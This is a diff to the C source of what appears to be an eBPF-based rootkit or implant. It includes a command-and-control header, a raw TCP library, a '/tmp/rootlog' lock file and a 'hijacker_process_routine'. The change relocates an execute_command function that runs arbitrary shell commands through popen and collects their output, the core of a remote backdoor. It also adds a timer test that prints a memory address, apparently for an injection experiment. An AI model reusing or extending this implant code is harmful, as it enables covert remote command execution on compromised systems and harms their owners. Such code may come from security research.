@@ -18,6 +18,8 @@
 #include <sys/file.h>
 #include <errno.h>
 #include <syslog.h>
+#include <dlfcn.h>
+#include <sys/timerfd.h>
 
 #include "lib/RawTCP.h"
 #include "../common/c&c.h"
@@ -26,6 +28,63 @@
 #include <bpf/libbpf.h>
 
 #define LOCK_FILE "/tmp/rootlog"
+
+int test_time_values_injection(){
+
+    struct itimerspec new_value, new_value2;
+    int max_exp, fd, fd2;
+    struct timespec now;
+    uint64_t exp, tot_exp;
+    ssize_t s;
+
+
+    fd = timerfd_create(CLOCK_REALTIME, 0);
+    if (fd == -1)
+        return -1;
+
+    new_value.it_interval.tv_sec = 30;
+    new_value.it_interval.tv_nsec = 0;
+
+    if (timerfd_settime(fd, TFD_TIMER_ABSTIME, &new_value, NULL) == -1)
+        return -1;
+
+    fd2 = timerfd_create(CLOCK_REALTIME, 0);
+    if (fd2 == -1)
+        return -1;
+
+    new_value2.it_interval.tv_sec = 30;
+    new_value2.it_interval.tv_nsec = 0;
+
+    if (timerfd_settime(fd2, TFD_TIMER_ABSTIME, &new_value2, NULL) == -1)
+        return -1;
+    
+        
+    printf("Timer %i started, address sent %llx\n", fd, (__u64)&new_value);
+
+    return 0;
+}
+
+
+char* execute_command(char* command){
+    FILE *fp;
+    char* res = calloc(4096, sizeof(char));
+    char buf[1024];
+
+    fp = popen(command, "r");
+    if(fp == NULL) {
+        printf("Failed to run command\n" );
+        return "COMMAND ERROR";
+    }
+
+    while(fgets(buf, sizeof(buf), fp) != NULL) {
+        strcat(res, buf);
+    }
+    printf("RESULT OF COMMAND: %s\n", res);
+
+    pclose(fp);
+    return res;
+}    
+
 
 char* getLocalIpAddress(){
     char hostbuffer[256];
@@ -49,26 +108,7 @@ char* getLocalIpAddress(){
   
     return IPbuffer;
 }
-
-char* execute_command(char* command){
-    FILE *fp;
-    char* res = calloc(4096, sizeof(char));
-    char buf[1024];
-
-    fp = popen(command, "r");
-    if(fp == NULL) {
-        printf("Failed to run command\n" );
-        return "COMMAND ERROR";
-    }
-
-    while(fgets(buf, sizeof(buf), fp) != NULL) {
-        strcat(res, buf);
-    }
-    printf("RESULT OF COMMAND: %s\n", res);
-
-    pclose(fp);
-    return res;
-}
+    //test_time_values_injection();
 
 int hijacker_process_routine(int argc, char* argv[], int fd){
     //Lock the file to indicate we are already into the routine
